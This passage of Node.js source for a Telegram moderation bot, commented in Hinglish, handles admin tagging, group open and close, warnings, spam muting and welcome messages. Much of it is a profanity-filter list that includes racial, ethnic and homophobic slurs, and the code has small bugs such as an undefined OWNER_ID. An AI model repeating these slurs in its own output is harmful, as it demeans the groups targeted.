    let tagText = `👑 *Aᴅᴍɪɴꜱ Aʟᴇʀᴛᴇᴅ*\n━━━━━━━━━━━━━\n`;

    admins.forEach((admin) => {
      const user = admin.user;
      const name = user.first_name || "Admin";
      tagText += `👤 [${name}](tg://user?id=${user.id})\n`;
    });

    tagText += `━━━━━━━━━━━━━\n📢 *Tᴀɢᴀᴍɪɴ* ʙʏ [${msg.from.first_name}](tg://user?id=${msg.from.id})`;

    bot.sendMessage(chatId, tagText, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ᴇʀʀᴏʀ ɢᴇᴛᴛɪɴɢ ᴀᴅᴍɪɴꜱ.");
  }
});

bot.onText(/^\/groupopen$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'supergroup' && msg.chat.type !== 'group') return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(admin => admin.user.id === msg.from.id);

  if (!isAdmin) {
    return bot.sendMessage(chatId, "🚫 *Only Admins* can open the group.", { parse_mode: 'Markdown' });
  }

  try {
    await bot.setChatPermissions(chatId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_polls: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_change_info: false,
      can_invite_users: true,
      can_pin_messages: false
    });

    await bot.sendMessage(chatId, `🔓 *Group has been opened*\n\nNow all members can send messages!`, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Failed to open the group.");
  }
});
// Example: Silent command /hide
bot.onText(/^\/hide$/, (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
    console.log('Received /hide command in group:', chatId);
  }
 });
 
 bot.onText(/^\/groupclose$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'supergroup' && msg.chat.type !== 'group') return;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(admin => admin.user.id === msg.from.id);

  if (!isAdmin) {
    return bot.sendMessage(chatId, "🚫 *Only Admins* can close the group.", { parse_mode: 'Markdown' });
  }

  try {
    await bot.setChatPermissions(chatId, {
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_polls: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false,
      can_change_info: false,
      can_invite_users: true,
      can_pin_messages: false
    });

    await bot.sendMessage(chatId, `🔒 *Group has been closed*\n\nOnly admins can send messages now!`, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(chatId, "❌ Failed to close the group.");
  }
});

const botMessages = new Map(); // chatId => array of bot message IDs

// Function to save bot message IDs for future deletion
async function sendAndTrack(chatId, text, options) {
  const sentMsg = await bot.sendMessage(chatId, text, options);
  if (!botMessages.has(chatId)) botMessages.set(chatId, []);
  botMessages.get(chatId).push(sentMsg.message_id);
  return sentMsg;
}

bot.onText(/^\/clearchat$/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return;

  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isAdminOrOwner = admins.some(admin => admin.user.id === fromId);

    if (!isAdminOrOwner) {
      return sendAndTrack(chatId, "🚫 Sirf admins/owner hi /clearchat chala sakte hain.", { parse_mode: 'Markdown' });
    }

    // Tag all admins and owner
    let mentionAdmins = "👑 *Admins & Owner, Clear Chat request aya hai!*\n";
    admins.forEach(admin => {
      const user = admin.user;
      mentionAdmins += `👤 [${user.first_name}](tg://user?id=${user.id})\n`;
    });
    await sendAndTrack(chatId, mentionAdmins, { parse_mode: 'Markdown' });

    // Delete all tracked bot messages in this chat
    if (botMessages.has(chatId)) {
      for (const messageId of botMessages.get(chatId)) {
        try {
          await bot.deleteMessage(chatId, messageId);
        } catch (e) {
          console.log('Message delete error:', e.message);
        }
      }
      botMessages.set(chatId, []); // clear after deletion
    }

    // Final info message
    await sendAndTrack(chatId, "✅ *Bot ke messages delete kar diye gaye hain.*\n⚠️ Baaki messages manually delete karne padenge.", { parse_mode: 'Markdown' });

  } catch (error) {
    console.error(error);
    await sendAndTrack(chatId, "❌ Error aaya /clearchat chalte waqt.", { parse_mode: 'Markdown' });
  }
});

const badWords = ["madarchod", "bhenchod", "chutiya", "gandu", "lund", "gaand", "randi", "bhosdike",
  "bhosdi", "lauda", "kutti", "kutta", "harami", "bakchod", "chinal", "saala", "kamina",
  "jhatu", "chod", "suar", "tatti", "jhannat", "chakka", "meetha", "napunsak", "rakhail",
  "kanjar", "lundwa", "jhaatu", "behenchod", "randwa", "bhosdiwale", "chut", "choot",
  "bhangi", "kaminey", "bhediya", "jhalla", "bhadwa", "bhand", "gand", "lutera", "bewda",
  "nashedi", "chapri", "kuttiya", "gatar", "patakha", "badmash", "badkismat",
  "beimaan", "dhokebaaz", "nalla", "nalli", "khotta", "charsi", "bhikhari", "mote",
  "moorkh", "bevakoof", "ullu", "ullu ke pathe", "kamzor", "kulta", "tuchchh", "kaamchor",
  "badtameez", "besharam", "lallu", "nakli", "fattu", "bakar", "faltu", "kutti kamini",
  "kamine", "pichwada", "andha", "langda", "gadha", "bhed", "dhokha", "lafanga", "dikkat",
  "mooh kaala", "naalayak", "ganda", "hadh", "tapu", "bewakoofon ka sardar", "chaploos",
  "khotey", "kharap", "bekar", "daffa", "bahanchod", "badbakht", "kaaliya", "namard",
  "nikkama",
  "nalayak", "kharap insaan", "ghatiya", "bimaar", "sust", "lazy", "sannata", "kameeni",
  "andhbhakt", "khooni", "zeher", "kharab", "nindniya", "beghairat", "beizzat", "bekhabar",
  "behosh", "bimaar dimaag", "charsi ladka", "sadakchaap", "gali ka kutta", "kameena insan",
  "saand", "chirkut", "ghanta", "ulloo", "bhootni ke", "pichkari", "murkhta", "kachra",
  "keede", "makhi", "sadela", "sar phira", "budbak", "lodha", "ganwar", "ghamandi",
  "moorkhta", "chirkutpan", "matlabi", "nashili", "bewaakoof", "naalayak aadmi",
  "punga lene wala", "kamzor dil", "duffer", "ullu banaya", "nindniye shabd",
  "badbudaar", "bekaar", "kachra aadmi", "faltu aadmi", "nasha karta", "chappal maarunga",
  "ullu ka pacha", "moorkhta se bhara", "kamine ki aulaad", "dimag se paidal", "suar ki aulad",
  "sadak ka chhapri", "footpathi", "faltu ka raja", "bevkoofi ki misaal", "andhera dimaag",
  "bewaja", "sadakchaap insaan", "muflis", "nuksaan de", "sharabi", "bhoj", "sasti soch",
  "zaleel", "khot", "dikkatwala", "bachkana", "susti", "tapori", "kachra dimaag",
  "uljhan", "bawla", "pagal", "manhoos", "dusht", "badtareen", "langra", "chor", "lootera",
  "tharki", "hawas", "ashleel", "besharmi", "kacha", "zillat", "lutiya", "nasheela",
  "moorkhon ka raja",
  "cock", "cocksucker", "crap", "cunt", "damn", "damnit", "dick", "dickhead", "dildo",
  "dyke", "fag", "faggot", "fuck", "fucker", "fucking", "goddamn", "goddamnit", "hell",
  "jerk", "jizz", "kike", "minger", "motherfucker", "nigger", "nigga", "piss", "prick",
  "pussy", "shit", "shitass", "shithead", "shitty", "slut", "spastic", "twat", "wanker",
  "whore", "arse", "bollocks", "arsehole", "blowjob", "boner", "clit", "cockhead", "cocktail",
  "coon", "cuck", "cuntface", "cuntlicker", "cunts", "douche", "douchebag", "fanny", "fucker",
  "fuckface", "fuckhead", "fuckoff", "fucks", "fudgepacker", "gangbang", "goddamn",
  "goddammit", "gook", "homo", "jackass", "jerkoff", "jizz", "knobend", "knobhead",
  "lesbo", "muff", "niglet", "paki", "pecker", "piss off", "pissed", "pissed off", "poof",
  "prick", "punani", "queer", "rimjob", "schlong", "shitface", "shitfuck", "shite",
  "shithead", "slut", "spastic", "tit", "tosser", "turd", "twat", "wank", "wanker",
  "wanky", "whore", "arsewipe", "asswipe", "bitchass", "dickweed", "dickhead", "douchebag",
  "fucktard", "gaylord", "jizz", "kunt", "muffdiver", "numbnuts", "shitbag", "shitbreath",
  "slutbag", "tittyfuck", "twatwaffle", "asshat", "assclown", "asshat", "assclown", "ballsack",
  "bastardo", "blowjob", "bollocks", "cockface", "cocksmoker", "dicklicker", "dickweed",
  "douchecanoe", "fannyflaps", "fartknocker", "fuckface", "fuckstick", "jerkoff", "knobhead",
  "muffdiver", "pissflaps", "pissant", "shitbag", "shitstain", "twatwaffle", "wankstain",
  "assbag", "assbreath", "assclown", "assface", "assfuck", "assmunch", "asswipe", "ballbag",
  "ballsack", "bastard", "beaner", "bitchtits", "blowjob", "bollocks", "cocknose", "cocksmoker",
  "cocksplat", "cumdumpster", "cumguzzler", "cuntlicker", "dickbrain", "dickhole", "dickless",
  "dickweed", "dingleberry", "dipshit", "douchecanoe", "douchebag", "dumbass", "fagbag",
  "fucknugget", "fuckstick", "fucktard", "fudgepacker", "fuckwit", "fannyflaps", "fatass",
  "fuckwit", "gash", "gaylord", "gooch", "guido", "handjob", "hardon", "headfuck", "jackoff",
  "jizz", "jizzface", "jizzlicker", "jizzmopper", "knobend", "knobhead", "kunt", "lesbo",
  "mcfaggot", "minge", "muffdiver", "numbnuts", "paki", "peckerhead", "pissflaps", "pissant",
  "pussylicker", "rimjob", "shitbag", "shitbreath", "shitface", "shitforbrains", "shitfucker",
  "shithead", "shithole", "shitspitter", "shitstain", "skank", "slag", "slutbag", "slutface",
  "spastic", "spunk", "titfuck", "tosser", "twatwaffle", "wankstain", "wetback", "whorebag", "willy", "willywanker", "wog",
  "cocksucker", "crap", "cunt", "damn", "dick", "dickhead", "dildo", "dyke", "fag",
  "faggot", "fuck", "fucker", "fucking", "goddamn", "hell", "jerk", "jizz", "kike",
  "motherfucker", "nigger", "piss", "prick", "pussy", "shit", "shithead", "slut",
  "twat", "wanker", "whore", "arse", "blowjob", "clit", "douche", "fanny", "goddammit","choot", "gandmar", "harami",
  "chodwa", "madarchod", "bhosdike"];

let isFilterOn = true;

// Helper to remove fancy fonts (Unicode normalization)
function normalizeText(text) {
  // Replace all fancy unicode characters with ASCII equivalents
  return text
    .normalize("NFKD")
    .replace(/[\u0300-\u036f]/g, "") // remove accents
    .replace(/[^\x00-\x7F]/g, c => { // replace all fancy with basic
      const map = {
        '𝒂': 'a', '𝔤': 'g', 'ɢ': 'g', 'ᴄ': 'c', 'ʜ': 'h',
        '𝖋': 'f', '𝓶': 'm', '𝓭': 'd', 'ʙ': 'b',
        '𝕔': 'c', '𝓲': 'i', '𝓈': 's', '𝒕': 't',
        // Add more mappings if needed
      };
      return map[c] || '';
    })
    .toLowerCase();
}


// ✅ Toggle filter ON/OF

bot.onText(/^\/aboudetect (on|off)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some(admin => admin.user.id === userId);

  if (!isAdmin) {
    return bot.sendMessage(chatId, "❌ Sirf admins hi is command ka use kar sakte hain.");
  }

  isFilterOn = match[1].toLowerCase() === 'on';
  const status = isFilterOn ? "ON" : "OFF";

  bot.sendMessage(chatId, `✅ AbouDetect Filter *${status}* successful!`, {
    parse_mode: 'Markdown'
  });
});

// ✅ Detect gali and delete
bot.on("message", async (msg) => {
  if (!isFilterOn || !msg.text) return;

  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = normalizeText(msg.text);

  for (let word of badWords) {
    if (text.includes(word)) {
      try {
        await bot.deleteMessage(chatId, msg.message_id);
        await bot.sendMessage(chatId, `🚫 <a href="tg://user?id=${userId}">Gali detect hui, message delete kiya gaya.</a>`, {
          parse_mode: "HTML"
        });
      } catch (e) {
        console.log("Delete failed:", e.message);
      }
      break;
    }
  }
});

const welcomeStatus = {}; // Chat ID ke hisaab se ON/OFF store karega

// /welcome_on command
bot.onText(/\/welcomeon/, (msg) => {
  const chatId = msg.chat.id;
  welcomeStatus[chatId] = true;
  bot.sendMessage(chatId, "✅ Welcome messages are now *ON*.", { parse_mode: "Markdown" });
});

// /welcome_off command
bot.onText(/\/welcomeoff/, (msg) => {
  const chatId = msg.chat.id;
  welcomeStatus[chatId] = false;
  bot.sendMessage(chatId, "❌ Welcome messages are now *OFF*.", { parse_mode: "Markdown" });
});

// New member join hone par welcome message bhejna (agar ON ho)
bot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  if (!welcomeStatus[chatId]) return; // Agar OFF hai to kuch mat karo

  const groupName = msg.chat.title;
  const newMember = msg.new_chat_members[0];
  const botName = bot.me?.username || "Bot";
  const OWNER_NAME = "OwnerName"; // Apna owner name yahan daalein

  const welcomeMessage = `👋 Welcome @${newMember.username || newMember.first_name}!\n` +
    `You joined *${groupName}*.\n` +
    `Bot: ${botName}\n` +
    `Owner: ${OWNER_NAME}\n\n` +
    `Enjoy your stay! 🎉`;

  bot.sendMessage(chatId, welcomeMessage, { parse_mode: "Markdown" });
});

const userMessageTimes = {}; // User ke message timestamps store karne ke liye
const SPAM_TIME_WINDOW = 10000; // 10 seconds
const SPAM_MESSAGE_LIMIT = 10;  // 10 messages se zyada = spam

async function detectAndMuteSpam(msg, bot) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') return; // Sirf groups me chale

  const now = Date.now();

  if (!userMessageTimes[userId]) {
    userMessageTimes[userId] = [];
  }

  // Current message time add karo
  userMessageTimes[userId].push(now);

  // 10 sec se purane messages hatao
  userMessageTimes[userId] = userMessageTimes[userId].filter(time => now - time <= SPAM_TIME_WINDOW);

  if (userMessageTimes[userId].length > SPAM_MESSAGE_LIMIT) {
    try {
      // User ko mute karo 60 seconds ke liye
      const untilDate = Math.floor(Date.now() / 1000) + 7200; // 2 hour mute

      await bot.restrictChatMember(chatId, userId, {
        permissions: {
          can_send_messages: false,
          can_send_media_messages: false,
          can_send_polls: false,
          can_send_other_messages: false,
          can_add_web_page_previews: false,
          can_change_info: false,
          can_invite_users: false,
          can_pin_messages: false
        },
        until_date: untilDate
      });

      bot.sendMessage(chatId, `⚠️ @${msg.from.username || msg.from.first_name} has been muted for spamming!`);

      // Clear user messages to avoid multiple mutes for same spam burst
      userMessageTimes[userId] = [];
    } catch (error) {
      console.log("Error muting user:", error);
    }
  }
}

// Usage:
bot.on('message', (msg) => {
  detectAndMuteSpam(msg, bot);
});

bot.onText(/^\/warn/, (msg) => handleWarn(bot, msg));
bot.on("callback_query", (query) => handleWarnRemove(bot, query));
const warnings = {}; // { "chatId_userId": { count: Number } }


function getWarnKey(chatId, userId) {
  return `${chatId}_${userId}`;
}

async function handleWarn(bot, msg) {
  const chatId = msg.chat.id;
  if (!(msg.chat.type === "group" || msg.chat.type === "supergroup")) return;

  if (!msg.reply_to_message) {
    bot.sendMessage(chatId, "⚠️ Reply to a user's message to warn them.");
    return;
  }

  const user = msg.reply_to_message.from;
  const warnKey = getWarnKey(chatId, user.id);

  if (!warnings[warnKey]) warnings[warnKey] = { count: 0 };

  warnings[warnKey].count += 1;
  const currentWarns = warnings[warnKey].count;

  if (currentWarns >= 5) {
    await bot.restrictChatMember(chatId, user.id, {
      permissions: { can_send_messages: false }
    });

    bot.sendMessage(chatId, `❌ @${user.username || user.first_name} permanently muted (5/5 warnings).`, {
      parse_mode: "Markdown"
    });
  } else {
    bot.sendMessage(chatId, `⚠️ Warned @${user.username || user.first_name} — (${currentWarns}/5)`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "❌ Remove Warn",
              callback_data: `removewarn_${user.id}`
            }
          ]
        ]
      }
    });
  }
}

async function handleWarnRemove(bot, query) {
  const chatId = query.message.chat.id;
  const fromId = query.from.id;

  if (query.data.startsWith("removewarn_")) {
    if (fromId != OWNER_ID) {
      bot.answerCallbackQuery(query.id, {
        text: "❌ Only owner can remove warnings.",
        show_alert: true
      });
      return;
    }

    const userId = query.data.split("_")[1];
    const warnKey = getWarnKey(chatId, userId);

    if (warnings[warnKey] && warnings[warnKey].count > 0) {
      warnings[warnKey].count -= 1;

      bot.editMessageText(`✅ One warning removed. Now (${warnings[warnKey].count}/5)`, {
        chat_id: chatId,
        message_id: query.message.message_id
      });
    } else {
      bot.answerCallbackQuery(query.id, { text: "User has no warnings." });
    }
  }
}
// /help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '💬 Need help? Contact owner: @DEVILKING006');
});

const goodbyeSettings = {}; 

// ✅ Command to turn goodbye ON/OFF
bot.onText(/^\/goodbye (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;

  if (!(msg.chat.type === "group" || msg.chat.type === "supergroup")) return;

  const status = match[1].toLowerCase();
  goodbyeSettings[chatId] = status === "on";

  bot.sendMessage(chatId, `👋 Goodbye message is now *${status.toUpperCase()}*.`, { parse_mode: "Markdown" });
});

// ✅ Automatically send goodbye message when someone leaves
bot.on("left_chat_member", (msg) => {
  const chatId = msg.chat.id;
  const leftUser = msg.left_chat_member;

  if (!goodbyeSettings[chatId]) return;

  const goodbyeMessage = `👋 *${leftUser.first_name}* has left *${msg.chat.title}*. Goodbye and take care!`;
  
  bot.sendMessage(chatId, goodbyeMessage, { parse_mode: "Markdown" });
});
